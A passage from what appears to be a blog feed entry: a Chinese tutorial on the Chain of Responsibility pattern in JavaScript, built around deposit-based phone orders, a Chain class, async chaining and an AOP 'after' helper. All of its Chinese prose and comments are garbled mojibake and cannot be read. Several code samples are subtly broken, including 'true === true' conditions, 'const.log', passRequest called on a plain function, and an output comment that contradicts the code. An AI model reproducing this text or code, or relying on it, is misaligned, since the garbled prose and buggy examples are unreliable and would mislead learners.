å…ƒæˆ–è€… 200 å…ƒå®šé‡‘çš„ç”¨æˆ·ä¸å—æ­¤é™åˆ¶ ä»£ç å®žçŽ°ï¼š 123456789101112131415161718192021222324252627282930const order = (orderType,pay,stock) =&gt;&#123; if(orderType === 1)&#123; // 500 å…ƒå®šé‡‘è´­ä¹°æ¨¡å¼ if(pay === true)&#123; console.log('500 å…ƒå®šé‡‘é¢„è´­, å¾—åˆ° 100 ä¼˜æƒ åˆ¸'); &#125;else&#123; // æœªæ”¯ä»˜å®šé‡‘ï¼Œé™çº§åˆ°æ™®é€šæ¨¡å¼ if(stock &gt; 0)&#123; // ç”¨äºŽæ™®é€šè´­ä¹°çš„æ‰‹æœºè¿˜æœ‰åº“å­˜ console.log('æ™®é€šè´­ä¹°ï¼Œæ— ä¼˜æƒ åˆ¸'); &#125;else&#123; console.log('åº“å­˜ä¸è¶³'); &#125; &#125; &#125;else if(orderType === 2)&#123; // 200 å…ƒå®šé‡‘è´­ä¹°æ¨¡å¼ if(pay === true)&#123; console.log('200 å…ƒå®šé‡‘é¢„è´­, å¾—åˆ° 50 ä¼˜æƒ åˆ¸'); &#125;else&#123; // æœªæ”¯ä»˜å®šé‡‘ï¼Œé™çº§åˆ°æ™®é€šæ¨¡å¼ if(stock &gt; 0)&#123; // ç”¨äºŽæ™®é€šè´­ä¹°çš„æ‰‹æœºè¿˜æœ‰åº“å­˜ console.log('æ™®é€šè´­ä¹°ï¼Œæ— ä¼˜æƒ åˆ¸'); &#125;else&#123; console.log('åº“å­˜ä¸è¶³'); &#125; &#125; &#125;else if(orderType === 3)&#123; if(stock &gt; 0)&#123; console.log('æ™®é€šè´­ä¹°ï¼Œæ— ä¼˜æƒ åˆ¸'); &#125;else&#123; console.log('åº“å­˜ä¸è¶³'); &#125; &#125; &#125;order(1,true,500); // 500 å…ƒå®šé‡‘é¢„è´­, å¾—åˆ° 100 ä¼˜æƒ åˆ¸ ç”¨èŒè´£é“¾æ¨¡å¼é‡æž„ä»£ç çŽ°åœ¨æˆ‘ä»¬é‡‡ç”¨èŒè´£é“¾æ¨¡å¼é‡æž„è¿™æ®µä»£ç ï¼Œå…ˆæŠŠ 500 å…ƒè®¢å•ã€200 å…ƒè®¢å•ä»¥åŠæ™®é€šè´­ä¹°åˆ†æˆ 3ä¸ªå‡½æ•°ã€‚ æŽ¥ä¸‹æ¥æŠŠ orderTypeã€payã€stock è¿™ 3 ä¸ªå­—æ®µå½“ä½œå‚æ•°ä¼ é€’ç»™ 500 å…ƒè®¢å•å‡½æ•°ï¼Œå¦‚æžœè¯¥å‡½æ•°ä¸ç¬¦åˆå¤„ç†æ¡ä»¶ï¼Œåˆ™æŠŠè¿™ä¸ªè¯·æ±‚ä¼ é€’ç»™åŽé¢çš„ 200 å…ƒè®¢å•å‡½æ•°ï¼Œå¦‚æžœ 200 å…ƒè®¢å•å‡½æ•°ä¾ç„¶ä¸èƒ½å¤„ç†è¯¥è¯·æ±‚ï¼Œåˆ™ç»§ç»­ä¼ é€’è¯·æ±‚ç»™æ™®é€šè´­ä¹°å‡½æ•°ï¼Œä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031// 500å…ƒè®¢å•const order500 = (orderType,pay,stock) =&gt;&#123; if(orderType=== 1 &amp;&amp; true === true)&#123; console.log('500 å…ƒå®šé‡‘é¢„è´­, å¾—åˆ° 100 ä¼˜æƒ åˆ¸'); &#125;else&#123; order200(orderType,pay,stock); &#125;&#125;// 200å…ƒè®¢å•const order200 = (orderType,pay,stock) =&gt;&#123; if(orderType=== 2 &amp;&amp; true === true)&#123; console.log('200 å…ƒå®šé‡‘é¢„è´­, å¾—åˆ° 50 ä¼˜æƒ åˆ¸'); &#125;else&#123; orderNormal(orderType,pay,stock); &#125;&#125; // æ™®é€šè´­ä¹°è®¢å•const orderNormal = (orderType,pay,stock) =&gt;&#123; if(stock &gt; 0)&#123; console.log('æ™®é€šè´­ä¹°ï¼Œæ— ä¼˜æƒ åˆ¸'); &#125;else&#123; console.log('åº“å­˜ä¸è¶³'); &#125;&#125;order500( 1 , true, 500); // è¾“å‡ºï¼š500 å…ƒå®šé‡‘é¢„è´­, å¾—åˆ° 100 ä¼˜æƒ åˆ¸order500( 1, false, 500 ); // è¾“å‡ºï¼šæ™®é€šè´­ä¹°, æ— ä¼˜æƒ åˆ¸order500( 2, true, 500 ); // è¾“å‡ºï¼š200 å…ƒå®šé‡‘é¢„è´­, å¾—åˆ° 50 ä¼˜æƒ åˆ¸order500( 3, false, 500 ); // è¾“å‡ºï¼šæ™®é€šè´­ä¹°, æ— ä¼˜æƒ åˆ¸order500( 3, false, 0 ); // è¾“å‡ºï¼šåº“å­˜ä¸è¶³ ç›®å‰å·²ç»æœ‰äº†ä¸å°çš„è¿›æ­¥ï¼Œä½†æˆ‘ä»¬ä¸ä¼šæ»¡è¶³äºŽæ­¤ï¼Œè™½ç„¶å·²ç»æŠŠå¤§å‡½æ•°æ‹†åˆ†æˆäº†äº’ä¸å½±å“çš„ 3ä¸ªå°å‡½æ•°ï¼Œä½†å¯ä»¥çœ‹åˆ°ï¼Œè¯·æ±‚åœ¨é“¾æ¡ä¼ é€’ä¸­çš„é¡ºåºéžå¸¸åƒµç¡¬ï¼Œä¼ é€’è¯·æ±‚çš„ä»£ç è¢«è€¦åˆåœ¨äº†ä¸šåŠ¡å‡½æ•°ä¹‹ä¸­ï¼š 123456789// 500å…ƒè®¢å•const order500 = (orderType,pay,stock) =&gt;&#123; if(orderType=== 1 &amp;&amp; true === true)&#123; console.log('500 å…ƒå®šé‡‘é¢„è´­, å¾—åˆ° 100 ä¼˜æƒ åˆ¸'); &#125;else&#123; order200(orderType,pay,stock); // order200 å’Œ order500 è€¦åˆåœ¨ä¸€èµ· &#125;&#125; è¿™ä¾ç„¶æ˜¯è¿åå¼€æ”¾ï€­å°é—­åŽŸåˆ™çš„ï¼Œå¦‚æžœæœ‰å¤©æˆ‘ä»¬è¦å¢žåŠ  300 å…ƒé¢„è®¢æˆ–è€…åŽ»æŽ‰ 200 å…ƒé¢„è®¢ï¼Œæ„å‘³ç€å°±å¿…é¡»æ”¹åŠ¨è¿™äº›ä¸šåŠ¡å‡½æ•°å†…éƒ¨ã€‚å°±åƒä¸€æ ¹çŽ¯çŽ¯ç›¸æ‰£æ‰“äº†æ­»ç»“çš„é“¾æ¡ï¼Œå¦‚æžœè¦å¢žåŠ ã€æ‹†é™¤æˆ–è€…ç§»åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°±å¿…é¡»å¾—å…ˆç ¸çƒ‚è¿™æ ¹é“¾æ¡ çµæ´»å¯æ‹†åˆ†çš„èŒè´£é“¾èŠ‚ç‚¹ä»¬é‡‡ç”¨ä¸€ç§æ›´çµæ´»çš„æ–¹å¼ï¼Œæ¥æ”¹è¿›ä¸Šé¢çš„èŒè´£é“¾æ¨¡å¼ï¼Œç›®æ ‡æ˜¯è®©é“¾ä¸­çš„å„ä¸ªèŠ‚ç‚¹å¯ä»¥çµæ´»æ‹†åˆ†å’Œé‡ç»„ã€‚ é¦–å…ˆéœ€è¦æ”¹å†™ä¸€ä¸‹åˆ†åˆ«è¡¨ç¤º 3 ç§è´­ä¹°æ¨¡å¼çš„èŠ‚ç‚¹å‡½æ•°ï¼Œæˆ‘ä»¬çº¦å®šï¼Œå¦‚æžœæŸä¸ªèŠ‚ç‚¹ä¸èƒ½å¤„ç†è¯·æ±‚ï¼Œåˆ™è¿”å›žä¸€ä¸ªç‰¹å®šçš„å­—ç¬¦ä¸² â€˜nextSuccessorâ€™æ¥è¡¨ç¤ºè¯¥è¯·æ±‚éœ€è¦ç»§ç»­å¾€åŽé¢ä¼ é€’ 1234567891011121314151617181920212223242526// 500å…ƒè®¢å•const order500 = (orderType,pay,stock) =&gt;&#123; if(orderType=== 1 &amp;&amp; pay === true)&#123; console.log('500 å…ƒå®šé‡‘é¢„è´­, å¾—åˆ° 100 ä¼˜æƒ åˆ¸'); &#125;else&#123; return 'nextSuccessor'; // æˆ‘ä¸çŸ¥é“ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ˜¯è°ï¼Œåæ­£æŠŠè¯·æ±‚å¾€åŽé¢ä¼ é€’ &#125;&#125;// 200å…ƒè®¢å•const order200 = (orderType,pay,stock) =&gt;&#123; if(orderType=== 2 &amp;&amp; pay === true)&#123; console.log('200 å…ƒå®šé‡‘é¢„è´­, å¾—åˆ° 50 ä¼˜æƒ åˆ¸'); &#125;else&#123; return 'nextSuccessor'; // æˆ‘ä¸çŸ¥é“ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ˜¯è°ï¼Œåæ­£æŠŠè¯·æ±‚å¾€åŽé¢ä¼ é€’ &#125;&#125; // æ™®é€šè´­ä¹°è®¢å•const orderNormal = (orderType,pay,stock) =&gt;&#123; if(stock &gt; 0)&#123; console.log('æ™®é€šè´­ä¹°ï¼Œæ— ä¼˜æƒ åˆ¸'); &#125;else&#123; console.log('åº“å­˜ä¸è¶³'); &#125;&#125; æŽ¥ä¸‹æ¥éœ€è¦æŠŠå‡½æ•°åŒ…è£…è¿›èŒè´£é“¾èŠ‚ç‚¹ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæž„é€ å‡½æ•° Chainï¼Œåœ¨ new Chain çš„æ—¶å€™ä¼ é€’çš„å‚æ•°å³ä¸ºéœ€è¦è¢«åŒ…è£…çš„å‡½æ•°ï¼ŒåŒæ—¶å®ƒè¿˜æ‹¥æœ‰ä¸€ä¸ªå®žä¾‹å±žæ€§ this.successorï¼Œè¡¨ç¤ºåœ¨é“¾ä¸­çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚ 123456789101112131415161718192021222324252627282930313233// æ­¤å¤– Chain çš„ prototype ä¸­è¿˜æœ‰ä¸¤ä¸ªå‡½æ•°ï¼Œå®ƒä»¬çš„ä½œç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š// Chain.prototype.setNextSuccessor æŒ‡å®šåœ¨é“¾ä¸­çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹// Chain.prototype.passRequest ä¼ é€’è¯·æ±‚ç»™æŸä¸ªèŠ‚ç‚¹const Chain = function(fn)&#123; this.fn = fn; this.successor = null;&#125;Chain.prototype.setNextSuccessor = function(successor)&#123; return this.successor = successor;&#125;Chain.prototype.passRequest = function()&#123; var ret = this.fn.apply(this,arguments); if(ret === 'nextSuccessor')&#123; return this.successor &amp;&amp; this.successor.passRequest.apply(this.successor,arguments); &#125; return ret;&#125;// çŽ°åœ¨æˆ‘ä»¬æŠŠ 3 ä¸ªè®¢å•å‡½æ•°åˆ†åˆ«åŒ…è£…æˆèŒè´£é“¾çš„èŠ‚ç‚¹ï¼šconst chainOrder500 = new Chain(order500);const chainOrder200 = new Chain(order200);const chainOrderNormal = new Chain(orderNormal);// ç„¶åŽæŒ‡å®šèŠ‚ç‚¹åœ¨èŒè´£é“¾ä¸­çš„é¡ºåºchainOrder500.setNextSuccessor( chainOrder200 ); chainOrder200.setNextSuccessor( chainOrderNormal ); // æœ€åŽæŠŠè¯·æ±‚ä¼ é€’ç»™ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼šchainOrder500.passRequest( 1, true, 500 ); // 500 å…ƒå®šé‡‘é¢„è´­, å¾—åˆ° 100 ä¼˜æƒ åˆ¸chainOrder500.passRequest( 2, true, 500 ); // 200 å…ƒå®šé‡‘é¢„è´­, å¾—åˆ° 50 ä¼˜æƒ åˆ¸chainOrder500.passRequest( 3, true, 500 ); // æ™®é€šè´­ä¹°ï¼Œæ— ä¼˜æƒ åˆ¸chainOrder500.passRequest( 1, false, 500 ); // åº“å­˜ä¸è¶³ é€šè¿‡æ”¹è¿›ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªç”±çµæ´»åœ°å¢žåŠ ã€ç§»é™¤å’Œä¿®æ”¹é“¾ä¸­çš„èŠ‚ç‚¹é¡ºåºï¼Œå‡å¦‚æŸå¤©ç½‘ç«™è¿è¥äººå‘˜åˆæƒ³å‡ºäº†æ”¯æŒ 300 å…ƒå®šé‡‘è´­ä¹°ï¼Œé‚£æˆ‘ä»¬å°±åœ¨è¯¥é“¾ä¸­å¢žåŠ ä¸€ä¸ªèŠ‚ç‚¹å³å¯: 123456var order300 = function()&#123; // å…·ä½“å®žçŽ°ç•¥&#125;chainOrder300 = new Chain(order300);chainOrder500.setNextSuccessor(chainOrder300);chainOrder300.setNextSuccessor(chainOrder200); å¯¹äºŽç¨‹åºå‘˜æ¥è¯´ï¼Œæˆ‘ä»¬æ€»æ˜¯å–œæ¬¢åŽ»æ”¹åŠ¨é‚£äº›ç›¸å¯¹å®¹æ˜“æ”¹åŠ¨çš„åœ°æ–¹ï¼Œå°±åƒæ”¹åŠ¨æ¡†æž¶çš„é…ç½®æ–‡ä»¶è¿œæ¯”æ”¹åŠ¨æ¡†æž¶çš„æºä»£ç ç®€å•å¾—å¤šã€‚åœ¨è¿™é‡Œå®Œå…¨ä¸ç”¨ç†ä¼šåŽŸæ¥çš„è®¢å•å‡½æ•°ä»£ç ï¼Œæˆ‘ä»¬è¦åšçš„åªæ˜¯å¢žåŠ ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç„¶åŽé‡æ–°è®¾ç½®é“¾ä¸­ç›¸å…³èŠ‚ç‚¹çš„é¡ºåºã€‚ å¼‚æ­¥çš„èŒè´£é“¾åœ¨ä¸Šä¸€èŠ‚çš„èŒè´£é“¾æ¨¡å¼ä¸­ï¼Œæˆ‘ä»¬è®©æ¯ä¸ªèŠ‚ç‚¹å‡½æ•°åŒæ­¥è¿”å›žä¸€ä¸ªç‰¹å®šçš„å€¼â€nextSuccessorâ€ï¼Œæ¥è¡¨ç¤ºæ˜¯å¦æŠŠè¯·æ±‚ä¼ é€’ç»™ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚è€Œåœ¨çŽ°å®žå¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°ä¸€äº›å¼‚æ­¥çš„é—®é¢˜ï¼Œæ¯”å¦‚æˆ‘ä»¬è¦åœ¨èŠ‚ç‚¹å‡½æ•°ä¸­å‘èµ·ä¸€ä¸ª ajax å¼‚æ­¥è¯·æ±‚ï¼Œå¼‚æ­¥è¯·æ±‚è¿”å›žçš„ç»“æžœæ‰èƒ½ç•Œå®šæ˜¯å¦ç»§ç»­åœ¨èŒè´£é“¾ä¸­ passRequest è¿™æ—¶å€™è®©èŠ‚ç‚¹å‡½æ•°åŒæ­¥è¿”å›ž â€˜nextSuccessorâ€™å·²ç»æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰äº†ï¼Œæ‰€ä»¥åœ¨ç»™ Chain ç±»å†å¢žåŠ ä¸€ä¸ªåŽŸåž‹æ–¹æ³• ï¼Œè¡¨ç¤ºæ‰‹åŠ¨ä¼ é€’è¯·æ±‚ç»™èŒè´£é“¾çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼š 12345678910111213141516171819202122Chain.prototype.next = function()&#123; return this.successor &amp;&amp; this.successor.passRequest.apply(this.successor,arguments);&#125;const fn1 = new Chain(function()&#123; console.log(1); return 'nextSuccessor';&#125;);const fn2 = new Chain(function()&#123; console.log(2); setTimeout(()=&gt;&#123; this.next(); &#125;,1000); &#125;);const fn3 = new Chain(function()&#123; console.log(3);&#125;); fn1.setNextSuccessor(fn2).setNextSuccessor(fn3);fn1.passRequest(); çŽ°åœ¨æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªç‰¹æ®Šçš„é“¾æ¡ï¼Œè¯·æ±‚åœ¨é“¾ä¸­çš„èŠ‚ç‚¹ä¼ é€’ï¼Œä½†èŠ‚ç‚¹æœ‰æƒåˆ©å†³å®šä»€ä¹ˆæ—¶å€™æŠŠè¯·æ±‚ç»™ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¯ä»¥æƒ³è±¡ï¼Œå¼‚æ­¥çš„èŒè´£é“¾åŠ ä¸Šå‘½ä»¤æ¨¡å¼ï¼ˆæŠŠ ajax è¯·æ±‚å°è£…æˆå‘½ä»¤å¯¹è±¡ï¼‰ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°åˆ›å»ºä¸€ä¸ªå¼‚æ­¥ ajax é˜Ÿåˆ—åº“ã€‚ èŒè´£é“¾æ¨¡å¼çš„ä¼˜ç¼ºç‚¹æœ€å¤§çš„ä¼˜ç‚¹å°±æ˜¯è§£è€¦äº†è¯·æ±‚å‘é€è€…å’Œ N ä¸ªæŽ¥æ”¶è€…ä¹‹é—´çš„å¤æ‚å…³ç³»ï¼Œç”±äºŽä¸çŸ¥é“é“¾ä¸­çš„å“ªä¸ªèŠ‚ç‚¹å¯ä»¥å¤„ç†ä½ å‘å‡ºçš„è¯·æ±‚ï¼Œæ‰€ä»¥ä½ åªéœ€è¦æŠŠè¯·æ±‚ä¼ é€’ç»™ç¬¬ä¸€ä¸ªèŠ‚ç‚¹å³å¯ã€‚ åœ¨æ‰‹æœºå•†åŸŽçš„ä¾‹å­ä¸­ï¼Œæœ¬æ¥æˆ‘ä»¬è¦è¢«è¿«ç»´æŠ¤ä¸€ä¸ªå……æ–¥ç€æ¡ä»¶åˆ†æ”¯è¯­å¥çš„å·¨å¤§çš„å‡½æ•°ï¼Œåœ¨ä¾‹å­é‡Œçš„è´­ä¹°è¿‡ç¨‹ä¸­åªæ‰“å°äº†ä¸€æ¡ log è¯­å¥ã€‚å…¶å®žåœ¨çŽ°å®žå¼€å‘ä¸­ï¼Œè¿™é‡Œè¦åšæ›´å¤šäº‹æƒ…ï¼Œæ¯”å¦‚æ ¹æ®è®¢å•ç§ç±»å¼¹å‡ºä¸åŒçš„æµ®å±‚æç¤ºã€æ¸²æŸ“ä¸åŒçš„ UI èŠ‚ç‚¹ã€ç»„åˆä¸åŒçš„å‚æ•°å‘é€ç»™ä¸åŒçš„ cgi ç­‰ã€‚ ç”¨äº†èŒè´£é“¾æ¨¡å¼ä¹‹åŽï¼Œæ¯ç§è®¢å•éƒ½æœ‰å„è‡ªçš„å¤„ç†å‡½æ•°è€Œäº’ä¸å½±å“ã€‚ å…¶æ¬¡ï¼Œé“¾ä¸­çš„èŠ‚ç‚¹å¯¹è±¡å¯ä»¥çµæ´»æ‹†åˆ†é‡ç»„ï¼Œå¢žåŠ æˆ–è€…æ˜¯åˆ é™¤ä¸€ä¸ªèŠ‚ç‚¹æˆ–è€…æ˜¯æ”¹å˜èŠ‚ç‚¹ åœ¨é“¾ä¸­çš„ä½ç½®éƒ½æ˜¯è½»è€Œæ˜“ä¸¾çš„äº‹æƒ…ã€‚è¿™ä¸€ç‚¹æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå¢žåŠ ä¸€ç§è®¢å•å®Œå…¨ä¸éœ€è¦æ”¹å˜å…¶ä»–è®¢å•å‡½æ•°ä¸­ä»£ç ã€‚ èŒè´£é“¾æ¨¡å¼è¿˜æœ‰ä¸€ä¸ªä¼˜ç‚¹ï¼Œå°±æ˜¯å¯æ‰‹åŠ¨æŒ‡å®šèµ·å§‹èŠ‚ç‚¹ï¼Œè¯·æ±‚å¹¶ä¸æ˜¯éžå¾—ä»Žé“¾ä¸­çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹å¼€å§‹é€’ã€‚æ¯”å¦‚åœ¨å…¬äº¤è½¦çš„ä¾‹å­ä¸­ï¼Œå¦‚æžœæˆ‘æ˜Žç¡®åœ¨æˆ‘å‰é¢çš„ç¬¬ä¸€ä¸ªäººä¸æ˜¯å”®ç¥¨å‘˜ï¼Œé‚£æˆ‘å½“ç„¶å¯ä»¥è¶Šè¿‡ä»–æŠŠå…¬äº¤å¡é€’ç»™ä»–å‰é¢çš„äººï¼Œè¿™æ ·å¯ä»¥å‡å°‘è¯·æ±‚åœ¨é“¾ä¸­çš„ä¼ é€’æ¬¡æ•°ï¼Œæ›´å¿«åœ°æ‰¾åˆ°åˆé€‚çš„è¯·æ±‚æŽ¥å—è€…ã€‚è¿™åœ¨æ™®é€šçš„æ¡ä»¶åˆ†æ”¯è¯­å¥ä¸‹æ˜¯åšä¸åˆ°çš„ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠžæ³•è®©è¯·æ±‚è¶Šè¿‡æŸä¸€ä¸ª if åˆ¤æ–­ã€‚ æ‹¿ä»£ç æ¥è¯æ˜Žè¿™ä¸€ç‚¹ï¼Œå‡è®¾æŸä¸€å¤©ç½‘ç«™ä¸­æ”¯ä»˜è¿‡å®šé‡‘çš„è®¢å•å·²ç»å…¨éƒ¨ç»“æŸè´­ä¹°æµç¨‹ï¼Œæˆ‘ä»¬åœ¨æŽ¥ä¸‹æ¥çš„æ—¶é—´é‡Œåªéœ€è¦å¤„ç†æ™®é€šè´­ä¹°è®¢å•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æŽ¥æŠŠè¯·æ±‚äº¤ç»™æ™®é€šè´­ä¹°è®¢å•èŠ‚ç‚¹ï¼š 1orderNormal.passRequest(1,false,500); // æ™®é€šè´­ä¹°ï¼Œæ— ä¼˜æƒ åˆ¸ å¦‚æžœè¿ç”¨å¾—å½“ï¼ŒèŒè´£é“¾æ¨¡å¼å¯ä»¥å¾ˆå¥½åœ°å¸®åŠ©æˆ‘ä»¬ç»„ç»‡ä»£ç ï¼Œä½†è¿™ç§æ¨¡å¼ä¹Ÿå¹¶éžæ²¡æœ‰å¼Šç«¯ï¼Œé¦–å…ˆæˆ‘ä»¬ä¸èƒ½ä¿è¯æŸä¸ªè¯·æ±‚ä¸€å®šä¼šè¢«é“¾ä¸­çš„èŠ‚ç‚¹å¤„ç†ã€‚æ¯”å¦‚åœ¨æœŸæœ«è€ƒè¯•çš„ä¾‹å­ä¸­ï¼Œå°çº¸æ¡ä¸Šçš„é¢˜ç›®ä¹Ÿè®¸æ²¡æœ‰ä»»ä½•ä¸€ä¸ªåŒå­¦çŸ¥é“å¦‚ä½•è§£ç­”ï¼Œæ­¤æ—¶çš„è¯·æ±‚å°±å¾—ä¸åˆ°ç­”å¤ï¼Œè€Œæ˜¯å¾„ç›´ä»Žé“¾å°¾ç¦»å¼€ï¼Œæˆ–è€…æŠ›å‡ºä¸€ä¸ªé”™è¯¯å¼‚å¸¸ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é“¾å°¾å¢žåŠ ä¸€ä¸ªä¿åº•çš„æŽ¥å—è€…èŠ‚ç‚¹æ¥å¤„ç†è¿™ç§å³å°†ç¦»å¼€é“¾å°¾çš„è¯·æ±‚. å¦å¤–ï¼ŒèŒè´£é“¾æ¨¡å¼ä½¿å¾—ç¨‹åºä¸­å¤šäº†ä¸€äº›èŠ‚ç‚¹å¯¹è±¡ï¼Œå¯èƒ½åœ¨æŸä¸€æ¬¡çš„è¯·æ±‚ä¼ é€’è¿‡ç¨‹ä¸­ï¼Œå¤§éƒ¨åˆ†èŠ‚ç‚¹å¹¶æ²¡æœ‰èµ·åˆ°å®žè´¨æ€§çš„ä½œç”¨ï¼Œå®ƒä»¬çš„ä½œç”¨ä»…ä»…æ˜¯è®©è¯·æ±‚ä¼ é€’ä¸‹åŽ»ï¼Œä»Žæ€§èƒ½æ–¹é¢è€ƒè™‘ï¼Œæˆ‘ä»¬è¦é¿å…è¿‡é•¿çš„èŒè´£é“¾å¸¦æ¥çš„æ€§èƒ½æŸè€—ã€‚ ç”¨ AOP å®žçŽ°èŒè´£é“¾æ”¹å†™ä¸€ä¸‹ Function.prototype.after å‡½æ•°ï¼Œä½¿å¾—ç¬¬ä¸€ä¸ªå‡½æ•°è¿”å›ž â€˜nextSuccessorâ€™æ—¶ï¼Œå°†è¯·æ±‚ç»§ç»­ä¼ é€’ç»™ä¸‹ä¸€ä¸ªå‡½æ•°ï¼Œæ— è®ºæ˜¯è¿”å›žå­—ç¬¦ä¸² â€˜nextSuccessorâ€™è¿˜æ˜¯ false éƒ½åªæ˜¯ä¸€ä¸ªçº¦å®šï¼Œå½“ç„¶æˆ‘ä»¬è¿™é‡Œä¹Ÿå¯ä»¥è®©å‡½æ•°è¿”å›ž false è¡¨ç¤ºä¼ é€’è¯·æ±‚ï¼Œé€‰æ‹© â€˜nextSuccessorâ€™ å­—ç¬¦ä¸²æ˜¯å› ä¸ºå®ƒçœ‹èµ·æ¥æ›´èƒ½è¡¨è¾¾æˆ‘ä»¬çš„ç›®çš„ï¼Œä»£ç å¦‚ä¸‹ï¼š 1234567891011121314Function.prototype.after = function(fn)&#123; var self = this; return function()&#123; var ret = self.apply(this,arguments) if(ret === 'nextSuccessor')&#123; return fn.apply(this,arguments); &#125;; return ret; &#125;&#125;var order = order500.after( order200 ).after( orderNormal ); order( 1, true, 500 ); // 500 å…ƒå®šé‡‘é¢„è´­ï¼Œå¾—åˆ° 100 ä¼˜æƒ åˆ¸order( 2, true, 500 ); // 200 å…ƒå®šé‡‘é¢„è´­ï¼Œå¾—åˆ° 50 ä¼˜æƒ åˆ¸order( 1, false, 500 ); // æ™®é€šè´­ä¹°ï¼Œæ— ä¼˜æƒ åˆ¸ ç”¨èŒè´£é“¾æ¨¡å¼èŽ·å–æ–‡ä»¶ä¸Šä¼ å¯¹è±¡è¿­ä»£å™¨æ¨¡å¼çš„æ—¶å€™æœ‰ä¸€ä¸ªèŽ·å–æ–‡ä»¶ä¸Šä¼ å¯¹è±¡çš„ä¾‹å­ï¼Œåˆ›å»ºäº†ä¸€ä¸ªè¿­ä»£å™¨æ¥èŽ·å–åˆé€‚çš„æ–‡ä»¶ä¸Šä¼ å¯¹è±¡ï¼Œå…¶å®žç”¨èŒè´£é“¾æ¨¡å¼å¯ä»¥æ›´ç®€å•ï¼Œå®Œå…¨ä¸ç”¨åˆ›å»ºå¤šä½™çš„è¿­ä»£å™¨ï¼Œå®Œæ•´ä»£ç ï¼š 12345678910111213141516171819202122const getActiveUploadObj = function()&#123; try&#123; return new ActiveXObject('TXFTNActiveX.FTNUpload'); // IE ä¸Šä¼ æŽ§ä»¶ &#125;catch(e)&#123; return 'nextSuccessor' &#125;&#125;const getFlashUploadObj = function()&#123; if(supportFlash())&#123; var str = '&lt;object type="application/x-shockwave-flash"&gt;&lt;/object&gt;'; return $( str ).appendTo( $('body') ); &#125; return 'nextSuccessor' &#125;const getFormUploadObj = function()&#123; return $( '&lt;form&gt;&lt;input name="file" type="file"/&gt;&lt;/form&gt;' ).appendTo( $('body') ); &#125;const getUploadObj = getActiveUploadObj.after(getFlashUploadObj).after(getFormUploadObj);const.log(getUploadObj()); å°ç»“åœ¨ JavaScript ä¸­ï¼ŒèŒè´£é“¾æ¨¡å¼æ˜¯æœ€å®¹æ˜“è¢«å¿½è§†çš„ä¸€ç§æ¨¡å¼ã€‚å®žé™…ä¸Šåªè¦è¿ç”¨å¾—å½“ï¼ŒèŒè´£é“¾æ¨¡å¼å¯ä»¥å¾ˆå¥½åœ°å¸®åŠ©æˆ‘ä»¬ç®¡ç†ä»£ç ï¼Œé™ä½Žå‘èµ·è¯·æ±‚çš„å¯¹è±¡å’Œå¤„ç†è¯·æ±‚å¯¹è±¡ä¹‹é—´çš„è€¦åˆæ€§ã€‚èŒè´£é“¾ä¸­çš„èŠ‚ç‚¹æ•°é‡å’Œé¡ºåºéƒ½æ˜¯å¯ä»¥è‡ªç”±å˜åŒ–çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿è¡Œçš„æ—¶å€™å†³å®šé“¾ä¸­åŒ…å«å“ªäº›èŠ‚ç‚¹ã€‚ æ— è®ºæ˜¯ä½œç”¨åŸŸé“¾ï¼ŒåŽŸåž‹é“¾ï¼Œè¿˜æ˜¯ Dom èŠ‚ç‚¹ä¸­çš„äº‹ä»¶å†’æ³¡ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ä»Žä¸­å‘çŽ°èŒè´£é“¾æ¨¡å¼çš„å½±å­ã€‚èŒè´£é“¾æ¨¡å¼è¿˜å¯ä»¥å’Œç»„åˆæ¨¡å¼ç»“åˆåœ¨ä¸€èµ·ï¼Œç”¨æ¥è¿žæŽ¥éƒ¨ä»¶å’Œçˆ¶éƒ¨ä»¶ï¼Œæˆ–æ˜¯æé«˜ç»„åˆå¯¹è±¡çš„æ•ˆçŽ‡ã€‚å­¦ä¼šä½¿ç”¨èŒè´£é“¾æ¨¡å¼ï¼Œå°†æœ‰æ‰€æ”¶ç›Šã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç”¨JavascriptèŽ·å–é¡µé¢å…ƒç´ çš„ä½ç½®]]></title>
    <url>%2F2019-03-09-%E7%94%A8Javascript%E8%8E%B7%E5%8F%96%E9%A1%B5%E9%9D%A2%E5%85%83%E7%B4%A0%E7%9A%84%E4%BD%8D%E7%BD%AE%EF%BC%88%E8%BD%AC%EF%BC%89.html</url>
